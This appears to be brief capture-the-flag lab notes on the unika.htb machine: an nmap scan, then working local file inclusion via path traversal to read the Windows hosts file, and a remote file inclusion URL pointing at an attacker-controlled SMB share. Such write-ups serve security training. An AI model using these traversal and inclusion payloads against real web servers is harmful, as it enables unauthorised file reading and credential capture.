# Nmap
```
PORT     STATE    SERVICE   REASON      VERSION
80/tcp   open     http      syn-ack     Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open     http      syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp filtered pando-pub no-response
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port 80 redirects to `http://unika.htb/`

# LFI and RFI Vuln
Website is susceptible to LFI and RFI
`http://unika.htb/index.php?page=german.html`
## LFI
`http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`

```
# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows. 
# This file contains the mappings of IP addresses to host names. Each entry should be kept on an individual line. The IP address should be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one space. 
# Additionally, comments (such as these) may be inserted on individual lines or following the machine name denoted by a '#' symbol. 
For example: 
# 102.54.94.97 rhino.acme.com 
# source server 
# 38.25.63.10 x.acme.com 
# x client host 
localhost name resolution is handled within DNS itself.
127.0.0.1 localhost 
::1 localhost
```

## RFI
`http://unika.htb/index.php?page=//10.10.14.6/somefile`